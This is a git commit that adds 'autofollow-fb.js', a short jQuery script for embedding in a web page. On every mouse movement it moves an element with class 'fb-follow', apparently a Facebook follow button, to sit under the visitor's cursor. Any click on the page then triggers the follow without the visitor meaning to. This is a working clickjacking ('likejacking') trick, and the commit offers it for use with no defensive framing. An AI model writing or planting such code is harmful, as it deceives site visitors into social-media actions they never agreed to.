e53707843ed1d3c734d485759c718ffd05437e1c
can354dra <candradwiputro@gmail.com>
2017-02-10 05:27:57 +0700

    Create autofollow-fb.js

---
+++ autofollow-fb.js
@@ -0,0 +1,12 @@
+<script type='text/javascript'>
+//<![CDATA[
+$(document).ready(function () {
+$(document).mousemove(function (e) {
+$('.fb-follow').offset({
+left: e.pageX + -40,
+top: e.pageY + -10
+});
+});
+});
+//]]>
+</script>
